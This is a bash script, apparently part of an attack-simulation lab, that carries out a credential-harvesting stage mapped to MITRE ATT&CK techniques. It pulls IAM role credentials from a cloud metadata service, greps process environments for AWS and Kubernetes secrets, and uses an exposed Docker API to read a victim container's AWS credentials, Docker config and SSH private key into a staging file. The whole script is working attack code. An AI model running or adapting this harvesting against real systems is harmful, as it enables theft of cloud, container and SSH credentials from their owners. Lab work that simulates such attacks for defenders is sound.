#!/usr/bin/env bash
# T1552.005 / T1552.001 / T1552.004 / T1083 — credential harvesting pipeline
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/common.sh
source "${SCRIPT_DIR}/lib/common.sh"
require_lab

CREDS_OUT="${STAGING_DIR}/harvested-creds.txt"
: > "${CREDS_OUT}"

log "Querying metadata service (T1552.005): ${METADATA_URL}"
{
  echo "=== METADATA ==="
  curl -fsS "${METADATA_URL}/iam/security-credentials/" 2>/dev/null || true
  curl -fsS "${METADATA_URL}/iam/security-credentials/lab-role" 2>/dev/null || true
} >> "${CREDS_OUT}"

log "Scanning /proc for cloud env vars (T1083)"
{
  echo "=== /proc environ ==="
  for f in /proc/[0-9]*/environ; do
    [[ -r "$f" ]] || continue
    if tr '\0' '\n' < "$f" | grep -qE 'AWS_|KUBERNETES_'; then
      echo "--- ${f} ---"
      tr '\0' '\n' < "$f" | grep -E 'AWS_|KUBERNETES_' || true
    fi
  done
} >> "${CREDS_OUT}" 2>/dev/null || true

log "Harvesting files from victim container via Docker API (T1552.001 / T1552.004)"
export DOCKER_HOST="${DOCKER_API_URL}"
VICTIM_ID="$(docker ps --filter 'name=victim-app' --format '{{.ID}}' | head -1)"
if [[ -z "${VICTIM_ID}" ]]; then
  VICTIM_ID="$(docker ps --format '{{.ID}} {{.Names}}' | grep victim-app | awk '{print $1}' | head -1 || true)"
fi

if [[ -n "${VICTIM_ID}" ]]; then
  {
    echo "=== victim files ==="
    docker exec "${VICTIM_ID}" cat /home/devops/.aws/credentials 2>/dev/null || true
    docker exec "${VICTIM_ID}" cat /home/devops/.docker/config.json 2>/dev/null || true
    docker exec "${VICTIM_ID}" cat /home/devops/.ssh/id_rsa 2>/dev/null || true
    docker exec "${VICTIM_ID}" cat /home/devops/.lab_ssh_creds 2>/dev/null || true
  } >> "${CREDS_OUT}"
else
  warn "Victim container not found; skipping file harvest"
fi

log "Credentials staged at ${CREDS_OUT}"
head -30 "${CREDS_OUT}"
